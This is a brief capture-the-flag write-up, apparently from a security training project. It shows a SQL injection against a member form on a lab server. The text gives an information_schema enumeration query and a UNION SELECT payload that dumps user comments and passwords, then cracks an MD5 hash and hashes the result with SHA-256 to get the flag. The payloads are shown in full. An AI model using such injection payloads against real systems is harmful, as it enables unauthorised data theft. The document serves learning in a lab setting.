We have a form to fill at the page "http://192.168.56.102/?page=member".

<img width="1307" alt="Screen Shot 2021-12-10 at 2 15 46 PM" src="https://user-images.githubusercontent.com/64800542/145579818-6fa28415-7c3f-47f0-b6c4-a7bb4f375bab.png">

It looks like backend use the input from it right in an SQL statement, like in the previus example. So we can use it for an "injection".

Let's take a look on schema:

>SELECT table_name, column_name FROM information_schema.columns

Now we know all the columns and names.

Let's see what is inside the hidden columns:

>1 AND 1=2 UNION SELECT planet
>, CONCAT(Commentaire, countersign) FROM users;

<img width="1068" alt="Screen Shot 2021-12-10 at 2 16 33 PM" src="https://user-images.githubusercontent.com/64800542/145579847-e5aa13d8-3c92-4998-ad9c-efa91e766540.png">


>5ff9d0165b4f92b14994e5c685cdce28 >> md5 >> FortyTwo >> lower() >> sh256 >> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5





